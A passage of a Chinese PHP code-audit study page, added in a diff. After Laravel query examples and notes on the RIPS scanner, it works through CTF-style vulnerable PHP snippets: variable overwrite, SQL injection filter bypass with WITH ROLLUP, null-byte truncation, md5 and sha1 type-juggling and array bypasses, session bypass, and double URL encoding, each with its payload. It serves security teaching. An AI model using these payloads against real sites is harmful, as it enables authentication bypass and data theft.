+    -&gt;selectRaw(<span class="org-string">'price * ? as price_with_tax'</span>, [1.0825])
+    -&gt;get();
+</pre>
+</div>
+</div>
+<div id="outline-container-h:7fec154d-d9de-461a-b455-41080ee84709" class="outline-5">
+<h5 id="h:7fec154d-d9de-461a-b455-41080ee84709"><a href="#h:7fec154d-d9de-461a-b455-41080ee84709">使用命名绑定</a></h5>
+<div class="outline-text-5" id="text-h:7fec154d-d9de-461a-b455-41080ee84709">
+<p>
+除了使用 ? 表示参数绑定外，你还可以使用命名绑定的形式来执行一个查询：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">$<span class="org-variable-name">results</span> = DB::select(<span class="org-string">'select * from users where id = :id'</span>, [<span class="org-string">'id'</span> =&gt; 1]);
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:c1e95214-4df4-4640-a234-63d0eae07124" class="outline-5">
+<h5 id="h:c1e95214-4df4-4640-a234-63d0eae07124"><a href="#h:c1e95214-4df4-4640-a234-63d0eae07124">执行 Insert 语句</a></h5>
+<div class="outline-text-5" id="text-h:c1e95214-4df4-4640-a234-63d0eae07124">
+<p>
+你可以使用 DB Facade 的 insert 方法来执行 insert 语句。跟 select 方法一样，该方法的第一个和第二个参数分别是原生 SQL 语句和绑定的数据：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">use Illuminate\Support\Facades\DB;
+
+DB::insert(<span class="org-string">'insert into users (id, name) values (?, ?)'</span>, [1, <span class="org-string">'Marc'</span>]);
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:0ee1d1d9-06ca-432c-bf53-458c9c0a216f" class="outline-5">
+<h5 id="h:0ee1d1d9-06ca-432c-bf53-458c9c0a216f"><a href="#h:0ee1d1d9-06ca-432c-bf53-458c9c0a216f">执行 Update 语句</a></h5>
+<div class="outline-text-5" id="text-h:0ee1d1d9-06ca-432c-bf53-458c9c0a216f">
+<p>
+update 方法用于更新数据库中现有的记录。该方法将会返回受到本次操作影响的记录行数：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">use Illuminate\Support\Facades\DB;
+$<span class="org-variable-name">affected</span> = DB::update(
+<span class="org-string">'update users set votes = 100 where name = ?'</span>,
+ [<span class="org-string">'Anita'</span>]
+);
+</pre>
+</div>
+
+<p>
+Laravel测试项目
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">git clone https://github.com/cretueusebiu/laravel-web-push-demo.git
+<span class="org-builtin">cd</span> laravel-web-push-demo
+cp .env.example .env
+composer install
+</pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-h:7632f2c4-00f2-4202-8a4a-26138fb26b10" class="outline-3">
+<h3 id="h:7632f2c4-00f2-4202-8a4a-26138fb26b10"><a href="#h:7632f2c4-00f2-4202-8a4a-26138fb26b10">安全小结</a></h3>
+<div class="outline-text-3" id="text-h:7632f2c4-00f2-4202-8a4a-26138fb26b10">
+<p>
+审计代码时，不管使用什么框架，重点识别用户输入怎么来的、敏感函数。
+</p>
+</div>
+</div>
+</section>
+<section id="outline-container-h:3da5cf8c-4e2d-4af9-896a-fc66765a21a9" class="outline-2">
+<h2 id="h:3da5cf8c-4e2d-4af9-896a-fc66765a21a9"><a href="#h:3da5cf8c-4e2d-4af9-896a-fc66765a21a9">php代码审计工具</a></h2>
+<div class="outline-text-2" id="text-h:3da5cf8c-4e2d-4af9-896a-fc66765a21a9">
+</div>
+<div id="outline-container-h:494e4e59-7166-4d71-baec-7ce5ff6479ac" class="outline-3">
+<h3 id="h:494e4e59-7166-4d71-baec-7ce5ff6479ac"><a href="#h:494e4e59-7166-4d71-baec-7ce5ff6479ac">RIPS</a></h3>
+<div class="outline-text-3" id="text-h:494e4e59-7166-4d71-baec-7ce5ff6479ac">
+<p>
+PHP脚本漏洞的静态源代码分析器。由于是对单个文件做数据流分析，但对php框架代码、大型文件分析有难度，所以现在很少用
+</p>
+
+<p>
+安装：
+</p>
+<ul class="org-ul">
+<li>下载地址： <a href="https://rips-scanner.sourceforge.net/#download">https://rips-scanner.sourceforge.net/#download</a></li>
+<li>将下载好的rips解压到网站根目录后，访问 <a href="http://localhost/rips/">http://localhost/rips/</a> 并开始扫描。
+<ul class="org-ul">
+<li>如windows安装phpstudy，放到工作目录</li>
+</ul></li>
+</ul>
+
+<p>
+界面说明：
+</p>
+<ul class="org-ul">
+<li>path / file: 扫描的目录。 勾选subdirs：扫描所有子目录。</li>
+<li>verbosity level：选择扫描结果的详细程度，缺省为1(建议就使用1)。</li>
+<li>vuln type：选择需要扫描的漏洞类型。支持命令注入、代码执行、SQL注入等十余种漏洞类型，缺省为全部扫描。</li>
+<li>code style：选择扫描结果的显示风格（支持9种语法高亮）。</li>
+<li>/regex/：使用正则表达式过滤结果。</li>
+</ul>
+
+<p>
+使用说明：
+</p>
+<ul class="org-ul">
+<li>输入目录后可以查看扫描结果。
+<ul class="org-ul">
+<li>如在phpstudy 安装dvwa项目，在path地址栏中输入dvwa目录路径</li>
+</ul></li>
+<li>点击右上角 <code>user input</code> 可以查看web输入，从详情中可以观察到数据流。</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-h:ec800b1f-f793-438e-9a61-4e66f27b7c90" class="outline-3">
+<h3 id="h:ec800b1f-f793-438e-9a61-4e66f27b7c90"><a href="#h:ec800b1f-f793-438e-9a61-4e66f27b7c90">自写python代码实现</a></h3>
+<div class="outline-text-3" id="text-h:ec800b1f-f793-438e-9a61-4e66f27b7c90">
+<ul class="org-ul">
+<li>sink点分析</li>
+<li>数据流解析</li>
+</ul>
+
+<p>
+解决上下文关系，利用AST(抽象语法树)  
+</p>
+
+<p>
+所有开发语言自带AST(抽象语法树)功能，它带了数据流关系，我们自己写代码分析源码中的数据流。类似
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">import xxx.ast.parse
+   parse(file)
+</pre>
+</div>
+
+<p>
+现在主流代码解析引擎也用AST，这是个基础的东西，同时还要有：
+</p>
+<ul class="org-ul">
+<li>单文件分析</li>
+<li>跨文件补充起来</li>
+</ul>
+</div>
+</div>
+</section>
+<section id="outline-container-h:6f632ee6-0858-439f-adfe-ba0999bcae1d" class="outline-2">
+<h2 id="h:6f632ee6-0858-439f-adfe-ba0999bcae1d"><a href="#h:6f632ee6-0858-439f-adfe-ba0999bcae1d">PHP 函数精讲</a></h2>
+<div class="outline-text-2" id="text-h:6f632ee6-0858-439f-adfe-ba0999bcae1d">
+<p>
+php中特有的函数，使用不当就会有安全问题。
+</p>
+</div>
+<div id="outline-container-h:fc9fd758-a334-4012-ab6f-1c73f72bd736" class="outline-3">
+<h3 id="h:fc9fd758-a334-4012-ab6f-1c73f72bd736"><a href="#h:fc9fd758-a334-4012-ab6f-1c73f72bd736">extract变量覆盖</a></h3>
+<div class="outline-text-3" id="text-h:fc9fd758-a334-4012-ab6f-1c73f72bd736">
+<p>
+PHP extract() 函数从数组中把变量导入到当前的符号表中。自动解析所有参数，并按key-value方式赋值。
+</p>
+
+<p>
+<a href="http://127.0.0.1/extract_vul.php?student=&amp;xxx=1">http://127.0.0.1/extract_vul.php?student=&amp;xxx=1</a>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+$password = '123456';
+$xxx = 'extract_file.txt';
+extract($_GET);
+if (isset($student)) { //判断变量是否为空
+  $content = trim(file_get_contents($xxx)); //读文件
+  if ($student == $content) {
+    echo $password;
+ } else {
+    echo 'ERROR';
+ }
+}
+&lt;?php
+</pre>
+</div>
+
+<p>
+因此，当我们输入代码中预定义好的变量名时，变量的值会被覆盖。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">localhost:3000/test.php?<span class="org-variable-name">student</span>=&amp;<span class="org-variable-name">xxx</span>=1
+</pre>
+</div>
+<p>
+在上例中，将xxx参数进行重新赋值，由于找不到对应文件，所以 $content 变量为空，student变量不给他赋值，那么这时就可以满足其中的 if ($student == $content) 条件，拿到password。
+</p>
+
+<p>
+使用的场景：
+</p>
+<ul class="org-ul">
+<li>被拿到源代码，通过代码审计找到了漏洞，比较隐蔽。</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-h:2b4f28de-9731-426d-9d8b-1b1b21e1f139" class="outline-3">
+<h3 id="h:2b4f28de-9731-426d-9d8b-1b1b21e1f139"><a href="#h:2b4f28de-9731-426d-9d8b-1b1b21e1f139">绕过过滤的空白字符</a></h3>
+<div class="outline-text-3" id="text-h:2b4f28de-9731-426d-9d8b-1b1b21e1f139">
+<p>
+使用空白字符绕过逻辑判断。如下
+</p>
+
+<p>
+可以引入\f（也就是%0c）在数字前面，来绕过最后那个is_palindrome_number函数，而对于前面的数字判断，因为intval会忽略这个字符，所以不会影响。
+</p>
+
+<ol class="org-ol">
+<li>要求 $req['number']==strval(intval($req['number']))</li>
+<li>要求intval($req['number']) == intval(strrev($req['number']))</li>
+<li>is_palindrome_number()返回False，这个条件只要在一个回文数比如191前面加一个字符即可实现</li>
+</ol>
+
+<div class="org-src-container">
+<pre class="src src-php">// 回文数（palindrome number）是指‌正读和反读完全相同的整数‌，例如0、11、121、12321等。
+function is_palindrome_number($number) {
+  $number = strval($number); //strval — 获取变量的字符串值
+  $i = 0;
+  $j = strlen($number) - 1; //strlen — 获取字符串长度
+  while($i &lt; $j) {
+    if($number[$i] !== $number[$j]) {  // 判断第1和最后一个，第2个和倒数第2个....
+      return false;
+   }
+    $i++;
+    $j--;
+ }
+  return true;
+}
+$a = trim($_GET['number']); //trim() 函数移除字符串两侧的空白字符或其他预定义字符
+echo intval($a);
+var_dump(
+  ($a==strval(intval($a)))&amp;
+  (intval($a)==intval(strrev($a)))&amp;
+  !is_palindrome_number($a)
+);
+// var_dump() 函数用于输出变量的相关信息
+// intval() 函数用于获取变量的整数值
+// strval() 函数用于获取变量的字符串值
+// strrev() 函数反转字符串
+?&gt;
+</pre>
+</div>
+
+<p>
+测试
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">localhost:3000/t.php?<span class="org-variable-name">number</span>=191
+<span class="org-function-name">191int</span>(0)
+
+localhost:3000/t.php?<span class="org-variable-name">number</span>=%0c191
+<span class="org-function-name">191int</span>(1)
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:711d094a-e2bc-474c-bad3-87542bdfc469" class="outline-3">
+<h3 id="h:711d094a-e2bc-474c-bad3-87542bdfc469"><a href="#h:711d094a-e2bc-474c-bad3-87542bdfc469">多重加密</a></h3>
+<div class="outline-text-3" id="text-h:711d094a-e2bc-474c-bad3-87542bdfc469">
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+  include 'common.php';
+  $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);
+  //把一个或多个数组合并为一个数组
+  class db
+ {
+    public $where;
+    function __wakeup()
+   {
+      if(!empty($this-&gt;where))
+     {
+        $this-&gt;select($this-&gt;where);
+     }
+   }
+    function select($where)
+   {
+      $sql = mysql_query('select * from user where '.$where);
+      //函数执行一条 MySQL 查询。
+      return @mysql_fetch_array($sql);
+      //从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false
+   }
+ }
+  if(isset($requset['token']))
+  //测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。
+ {
+    $login = unserialize(gzuncompress(base64_decode($requset['token'])));
+    //gzuncompress:进行字符串解压缩
+    //unserialize: 将已序列化的字符串还原回 PHP 的值
+    $db = new db();
+    $row = $db-&gt;select('user=\''.mysql_real_escape_string($login['user']).'\'');
+    //mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。
+    if($login['user'] === 'xxx')
+   {
+      echo $flag;
+   }else if($row['pass'] !== $login['pass']){
+      echo 'unserialize injection!!';
+   }else{
+      echo "(╯‵□′)╯︵┴─┴ ";
+   }
+ }else{
+    header('Location: index.php?error=1');
+ }
+?&gt;
+</pre>
+</div>
+
+<p>
+<code>$login = unserialize(gzuncompress(base64_decode($requset['token'])));</code>
+</p>
+
+<p>
+可以看到，需要拿到token，之后进行 <b>base64解码-&gt;字符串解压缩-&gt;反序列化</b> ，最终拿到变量 user 的值进行判
+断，如果等于 xxx 则成功拿到 flag，那么我们的思路就是将上面的编码过程进行逆转 <b>base64加密-&gt;字符串压缩-&gt;序列化</b> 。
+</p>
+
+<p>
+因此可以得到如下payload：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+$arr = array('user' =&gt; 'xxx');
+$token = base64_encode(gzcompress(serialize($arr)));
+print_r($token);
+</pre>
+</div>
+
+<p>
+eJxLtDK0qi62MrFSKi1OLVKyLrYys1LKTUxPTSlVsq4FAI3UCWc=
+</p>
+</div>
+</div>
+<div id="outline-container-h:4f0227fc-8b2c-41ab-8ac8-c3e308dda9d1" class="outline-3">
+<h3 id="h:4f0227fc-8b2c-41ab-8ac8-c3e308dda9d1"><a href="#h:4f0227fc-8b2c-41ab-8ac8-c3e308dda9d1">SQL注入_WITH ROLLUP绕过</a></h3>
+<div class="outline-text-3" id="text-h:4f0227fc-8b2c-41ab-8ac8-c3e308dda9d1">
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+error_reporting(0);
+if (!isset($_POST['uname']) || !isset($_POST['pwd'])) {
+  echo '&lt;form action="" method="post"&gt;'."&lt;br/&gt;";
+  echo '&lt;input name="uname" type="text"/&gt;'."&lt;br/&gt;";
+  echo '&lt;input name="pwd" type="text"/&gt;'."&lt;br/&gt;";
+  echo '&lt;input type="submit" /&gt;'."&lt;br/&gt;";
+  echo '&lt;/form&gt;'."&lt;br/&gt;";
+  echo '&lt;!--source: source.txt--&gt;'."&lt;br/&gt;";
+  die;
+}
+function AttackFilter($StrKey,$StrValue,$ArrReq){ 
+  if (is_array($StrValue)){
+//检测变量是否是数组
+    $StrValue=implode($StrValue);
+//返回由数组元素组合成的字符串
+ }
+  if (preg_match("/".$ArrReq."/is",$StrValue)==1){ 
+//匹配成功一次后就会停止匹配
+    print "xxx_error！";
+    exit();
+ }
+}
+$filter = "and|select|from|where|union|join|sleep|benchmark|,|\(|\)";
+foreach($_POST as $key=&gt;$value){
+//遍历数组
+  AttackFilter($key,$value,$filter);
+}
+$con = mysql_connect("XXXXXX","XXXXXX","XXXXXX");
+if (!$con){
+  die('Could not connect: ' . mysql_error());
+}
+$db="XXXXXX";
+mysql_select_db($db, $con);
+//设置活动的 MySQL 数据库
+$sql="SELECT * FROM interest WHERE uname = '{$_POST['uname']}'";
+$query = mysql_query($sql);
+//执行一条 MySQL 查询
+if (mysql_num_rows($query) == 1) {
+//返回结果集中行的数目
+  $key = mysql_fetch_array($query);
+//返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false
+  if($key['pwd'] == $_POST['pwd']) {
+    print "www.xxx.com";
+ }else{
+    print "error";
+ }
+}else{
+  print "error！";
+}
+mysql_close($con);
+?&gt;
+</pre>
+</div>
+
+<div class="org-src-container">
+<pre class="src src-php">if (mysql_num_rows($query) == 1) {
+//返回结果集中行的数目
+  $key = mysql_fetch_array($query);
+//返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false
+  if($key['pwd'] == $_POST['pwd']) {
+    print "www.xxx.com";
+ }else{
+    print "error";
+ }
+</pre>
+</div>
+
+<p>
+查看代码发现，注入成功要满足2个条件：
+</p>
+<ol class="org-ol">
+<li>mysql_num_rows($query) == 1 ,也就是查询返回的结果行数为1</li>
+<li>$key[‘pwd’] == $_POST[‘pwd’] 即查询返回的结果与POST发送的pwd值相同</li>
+</ol>
+
+<p>
+其中filter 对特殊字符进行了过滤，但是没有过滤 or ,因此可以使用or将表的内容都查询出来
+</p>
+
+<p>
+<code>$filter = "and|select|from|where|union|join|sleep|benchmark|,|\(|\)";</code>
+</p>
+
+<p>
+限制查询结果为 1 行，则可以使用 limit，offset 关键字
+</p>
+
+<p>
+思路：
+如果能做出来查出来的密码是空，就可以判断左右相等了。这里使用mysql中函数 with rollup 对列求和，密码是字符串求和为空。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">mysql&gt; select user,password from users where <span class="org-variable-name">user</span>=<span class="org-string">'admin'</span> or 1 
++---------+----------------------------------+
+| user   | password             |
++---------+----------------------------------+
+| pablo  | 0d107d09f5bbe40cade3de5c71e9e9b7 |
+| admin  | 14c879f3f5d8ed93a09f6090d77c2cc3 |
+| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 |
+| 1337   | 8d3533d75ae2c3966d7e0d4fcc69216b |
+| gordonb | e99a18c428cb38d5f260853678922e03 |
++---------+----------------------------------+
+
+mysql&gt; select user,password from users where <span class="org-variable-name">user</span>=<span class="org-string">'admin'</span> or 1 group by password with rollup;
++---------+----------------------------------+
+| user   | password             |
++---------+----------------------------------+
+| pablo  | 0d107d09f5bbe40cade3de5c71e9e9b7 |
+| admin  | 14c879f3f5d8ed93a09f6090d77c2cc3 |
+| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 |
+| 1337   | 8d3533d75ae2c3966d7e0d4fcc69216b |
+| gordonb | e99a18c428cb38d5f260853678922e03 |
+| gordonb | NULL               |
++---------+----------------------------------+
+6 rows<span class="org-keyword"> in</span> set (0.00 sec)
+
+mysql&gt; select user,password from users where <span class="org-variable-name">user</span>=<span class="org-string">'admin'</span> or 1 group by password with rollup limit 1 offset 5;
++---------+----------+
+| user   | password |
++---------+----------+
+| gordonb | NULL   |
++---------+----------+
+1 row<span class="org-keyword"> in</span> set (0.01 sec)
+</pre>
+</div>
+
+<p>
+因此Payload可以写为如下语句:
+</p>
+
+<p>
+<code>admin' GROUP BY password WITH ROLLUP LIMIT 1 OFFSET 1-- -</code>
+</p>
+
+<p>
+使用 WITH ROLLUP，此函数是对聚合函数进行求和， with rollup是对 group by 后的第一个字段，进行分组求和。
+</p>
+</div>
+</div>
+<div id="outline-container-h:d2b6647d-79f0-4e44-b3e7-4bb7e2f36006" class="outline-3">
+<h3 id="h:d2b6647d-79f0-4e44-b3e7-4bb7e2f36006"><a href="#h:d2b6647d-79f0-4e44-b3e7-4bb7e2f36006">ereg正则%00截断</a></h3>
+<div class="outline-text-3" id="text-h:d2b6647d-79f0-4e44-b3e7-4bb7e2f36006">
+<p>
+ereg 函数使用需要PHP版本在5.3及以下
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+$flag = "flag";
+if (isset ($_GET['password']))
+{
+ if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
+{
+  echo '&lt;p&gt;You password must be alphanumeric&lt;/p&gt;';
+}
+ else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999)
+ {
+  if (strpos ($_GET['password'], '*-*') !== FALSE) //strpos — 查找字符串首次出现的位置
+  {
+   die('Flag: ' . $flag);
+  }
+   else
+  {
+    echo('&lt;p&gt;*-* have not been found&lt;/p&gt;');
+   }
+  }
+  else
+  {
+    echo '&lt;p&gt;Invalid password&lt;/p&gt;';
+  }
+ }
+?&gt;
+</pre>
+</div>
+
+<p>
+1.GET方式提交password，然后用ereg()正则限制了password的形式，只能是一个或者多个数字、大小写字母
+2.strlen()限制了长度小于8并且大小必须大于9999999
+3.继续strpos()对password进行匹配，必须含有 <b>-</b> ，最终才输出flag
+</p>
+
+<p>
+因为ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配。
+</p>
+
+<p>
+对于另一个问题可以使用科学计数法表示，计算器或电脑表达10的的幂是一般是e，也就是1.99714e13=19971400000000，所以构造 1e8 即 100000000 &gt; 9999999，在加上 <b>-</b> 。
+</p>
+
+<p>
+于是乎构造 password=1e8%00*-* ,成功得到答案
+</p>
+</div>
+</div>
+<div id="outline-container-h:1a75de0b-df2a-4e37-8680-86dcd2955ed4" class="outline-3">
+<h3 id="h:1a75de0b-df2a-4e37-8680-86dcd2955ed4"><a href="#h:1a75de0b-df2a-4e37-8680-86dcd2955ed4">sha()函数比较绕过</a></h3>
+<div class="outline-text-3" id="text-h:1a75de0b-df2a-4e37-8680-86dcd2955ed4">
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+$flag = "xxx";
+if (isset($_GET['name']) and isset($_GET['password']))
+{
+  if ($_GET['name'] == $_GET['password'])
+    echo '&lt;p&gt;Your password can not be your name!&lt;/p&gt;';
+  else if (sha1($_GET['name']) === sha1($_GET['password']))
+   die('Flag: '.$flag);
+  else
+    echo '&lt;p&gt;Invalid password.&lt;/p&gt;';
+}
+else
+  echo '&lt;p&gt;Login first!&lt;/p&gt;';
+?&gt;
+</pre>
+</div>
+
+<p>
+注意：同样需要老版本的php
+</p>
+
+<p>
+<code>http://127.0.0.1/07.php?name[]=1&amp;password[]=2</code>
+</p>
+
+<p>
+<code>=</code> 会比较类型，比如 bool sha1() 函数和 md5() 函数存在着漏洞， sha1() 函数默认的传入参数类型是字符串型，传入数组的情况下出现错误，使 sha1() 函数返回错误，也就是返回 false ，这时 <code>=</code> 运算符就判断为true，需要构造 username 和 password 既不相等，又同样是数组类型
+</p>
+
+<p>
+可以用如下代码进行测试
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">&lt;?php
+$<span class="org-variable-name">a</span>[] = 1;
+$<span class="org-variable-name">b</span>[] = 2;
+<span class="org-function-name">var_dump</span>(sha1($<span class="org-variable-name">a</span>) === sha1($<span class="org-variable-name">b</span>));
+
+<span class="org-comment-delimiter">#</span><span class="org-comment">&#36755;&#20986;
+</span><span class="org-function-name">bool</span>(<span class="org-builtin">true</span>)
+PHP Warning:  sha1() expects parameter 1 to be string, array given<span class="org-keyword"> in</span> C:\Users\Administrator\Desktop\shell\07-test.php on line 4
+PHP Warning:  sha1() expects parameter 1 to be string, array given<span class="org-keyword"> in</span> C:\Users\Administrator\Desktop\shell\07-test.php on line 4
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:257bcb5c-3ee7-4f73-82b1-6fc43ceb3782" class="outline-3">
+<h3 id="h:257bcb5c-3ee7-4f73-82b1-6fc43ceb3782"><a href="#h:257bcb5c-3ee7-4f73-82b1-6fc43ceb3782">SESSION验证绕过</a></h3>
+<div class="outline-text-3" id="text-h:257bcb5c-3ee7-4f73-82b1-6fc43ceb3782">
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+$flag = "xxx";
+session_start(); //启动一个session
+if (isset ($_GET['password'])) {
+  if ($_GET['password'] == $_SESSION['password'])
+    die ('Flag: '.$flag);
+  else
+    print '&lt;p&gt;Wrong guess.&lt;/p&gt;';
+}
+mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));  //session中内容每次都是随机的
+?&gt;
+</pre>
+</div>
+
+<p>
+看关键的一行 <code>if ($_GET['password'] == $_SESSION['password'])</code>
+</p>
+
+<p>
+需要session中的password值和用户传的一样，就可以成功拿到flag
+</p>
+
+<p>
+所以我们只需要删掉session值，或者修改session值为一个不存在的session，这样服务器获取不到session，则password为空，我们传一个空的password的进去即可拿到flag。
+</p>
+
+<p>
+我们利用的原理如下：
+<b>在PHP配置中的默认情况下，Session是用Session ID来确定当前对话所对应的服务器Session，sessionID可在cookie中找到，当我们删除cookie中的sessionID后，$_SESSION[‘password’]就会返回空，我们同样传入空的password就能绕过了。</b>
+</p>
+
+<p>
+因此 payload 为 <code>password=</code> 且 删除 cookie的值
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">http://127.0.0.1/08.php?<span class="org-variable-name">password</span>=
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:97daa910-2762-4282-9e2b-3f4a56cd82a2" class="outline-3">
+<h3 id="h:97daa910-2762-4282-9e2b-3f4a56cd82a2"><a href="#h:97daa910-2762-4282-9e2b-3f4a56cd82a2">密码md5比较绕过</a></h3>
+<div class="outline-text-3" id="text-h:97daa910-2762-4282-9e2b-3f4a56cd82a2">
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+error_reporting(0);
+$flag = 'flag{xxx}';
+if (isset($_GET['username']) and isset($_GET['password'])) {
+  if ($_GET['username'] == $_GET['password'])
+    print 'Your password can not be your username.';
+  else if (md5($_GET['username']) == md5($_GET['password']))
+    die('Flag: '.$flag);
+  else
+    print 'Invalid password';
+}
+?&gt;
+</pre>
+</div>
+
+<p>
+若为 <code>md5($_GET['username']) == md5($_GET['password'])</code>
+</p>
+
+<p>
+则可以构造： <a href="http://172.22.0.5/09.php?username=QNKCDZO&amp;password=240610708">http://172.22.0.5/09.php?username=QNKCDZO&amp;password=240610708</a> 因为 == 对比的时候会进行数据转换， 0eXXXXXXXXXX 转成 0 了
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-function-name">md5</span>(<span class="org-string">'240610708'</span>) //0e462097431906509019562988736854
+<span class="org-function-name">md5</span>(<span class="org-string">'QNKCDZO'</span>) //0e830400451993494058024219903391
+0e &#32431;&#25968;&#23383;&#36825;&#31181;&#26684;&#24335;&#30340;&#23383;&#31526;&#20018;&#22312;&#21028;&#26029;&#30456;&#31561;&#30340;&#26102;&#20505;&#20250;&#34987;&#35748;&#20026;&#26159;&#31185;&#23398;&#35745;&#25968;&#27861;&#30340;&#25968;&#23383;&#65292;&#20808;&#20570;&#23383;&#31526;&#20018;&#21040;&#25968;&#23383;&#30340;&#36716;&#25442;&#12290;
+<span class="org-function-name">md5</span>(<span class="org-string">'240610708'</span>)==md5(<span class="org-string">'QNKCDZO'</span>); //True
+<span class="org-function-name">md5</span>(<span class="org-string">'240610708'</span>)===md5(<span class="org-string">'QNKCDZO'</span>); //False
+
+&#36825;&#26679;&#30340;&#23545;&#24212;&#25968;&#20540;&#36824;&#26377;&#65306;
+<span class="org-function-name">var_dump</span>(md5(<span class="org-string">'240610708'</span>) == md5(<span class="org-string">'QNKCDZO'</span>));
+<span class="org-function-name">var_dump</span>(md5(<span class="org-string">'aabg7XSs'</span>) == md5(<span class="org-string">'aabC9RqS'</span>));
+<span class="org-function-name">var_dump</span>(sha1(<span class="org-string">'aaroZmOk'</span>) == sha1(<span class="org-string">'aaK1STfY'</span>));
+<span class="org-function-name">var_dump</span>(sha1(<span class="org-string">'aaO8zKZF'</span>) == sha1(<span class="org-string">'aa3OFF9m'</span>));
+<span class="org-function-name">var_dump</span>(<span class="org-string">'0010e2'</span> == <span class="org-string">'1e3'</span>);
+<span class="org-function-name">var_dump</span>(<span class="org-string">'0x1234Ab'</span> == <span class="org-string">'1193131'</span>);
+<span class="org-function-name">var_dump</span>(<span class="org-string">'0xABCdef'</span> == <span class="org-string">' 0xABCdef'</span>);
+</pre>
+</div>
+
+<p>
+也可以使用数组绕过 <code>http://127.0.0.1/09.php?username[]=1&amp;password[]=2</code>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-variable-name">&#20294;&#27492;&#22788;&#26159;</span> === &#65292;&#21482;&#33021;&#29992;&#25968;&#32452;&#32469;&#36807;&#65292; PHP &#23545;&#25968;&#32452;&#36827;&#34892; hash &#35745;&#31639;&#37117;&#20250;&#24471;&#20986; null &#30340;&#31354;&#20540;
+
+http://127.0.0.1/Php_Bug/18.php?<span class="org-variable-name">username</span>[]=1&amp;password[]=2
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:e15abb1d-6d4f-4988-b030-b936e16e9e9a" class="outline-3">
+<h3 id="h:e15abb1d-6d4f-4988-b030-b936e16e9e9a"><a href="#h:e15abb1d-6d4f-4988-b030-b936e16e9e9a">urldecode二次编码绕过</a></h3>
+<div class="outline-text-3" id="text-h:e15abb1d-6d4f-4988-b030-b936e16e9e9a">
+<p>
+只有代码本身代码编码时，才能用多重编码。url编码浏览器自动解码一次，服务器解码n次
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+// if(eregi("mbc",$_GET[id])) { // 获得get请求的id，里面必须带xxx字符
+if(mb_ereg("mbc",$_GET[id])) { // 获得get请求的id，里面必须带xxx字符
+ echo("&lt;p&gt;not allowed!&lt;/p&gt;");
+ exit();
+}
+$_GET['id'] = urldecode($_GET[id]); // 使用urldecode获取get请求中id
+if($_GET[id] == "mbc")
+{
+ echo "&lt;p&gt;Access granted!&lt;/p&gt;";
+ echo "&lt;p&gt;flag: This is mbc flag!!!} &lt;/p&gt;";
+}
+?&gt;
+</pre>
+</div>
+
+<p>
+由于浏览器的一次urldecode，再由服务器端函数的一次decode，造成二次编码，而绕过过滤。 如 %2527 ，两次urldecode会最后变成 '
+</p>
+
+<p>
+我们将 flag 中第一个字符 m 进行url二次编码， URL 编码为： %6d ，二次编码为 %256d ，绕过 <a href="http://172.22.0.5/10.php?id=%256dbc">http://172.22.0.5/10.php?id=%256dbc</a>
+</p>
+</div>
+</div>
+<div id="outline-container-h:0e55213c-f905-434e-96c2-e55e33877dff" class="outline-3">
+<h3 id="h:0e55213c-f905-434e-96c2-e55e33877dff"><a href="#h:0e55213c-f905-434e-96c2-e55e33877dff">intval函数取整</a></h3>
+<div class="outline-text-3" id="text-h:0e55213c-f905-434e-96c2-e55e33877dff">
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+if($_GET[id]) {
+ mysql_connect(SAE_MYSQL_HOST_M . ':' .
+SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
+ mysql_select_db(SAE_MYSQL_DB);
+ $id = intval($_GET[id]);
+ $query = @mysql_fetch_array(mysql_query("select content from ctf2 where id='$id'"));
+ if ($_GET[id]==1024) {
+   echo "&lt;p&gt;no! try again&lt;/p&gt;";
+}
+ else{
+  echo($query[content]);
+}
+}
+?&gt;
+</pre>
+</div>
+
+<p>
+要输入的值就是1024，但不让用1024查，怎么办？
+</p>
+
+<p>
+1024.1 绕过
+</p>
+</div>
+</div>
+<div id="outline-container-h:b0255428-392d-4422-b5da-88bd7d24e836" class="outline-3">
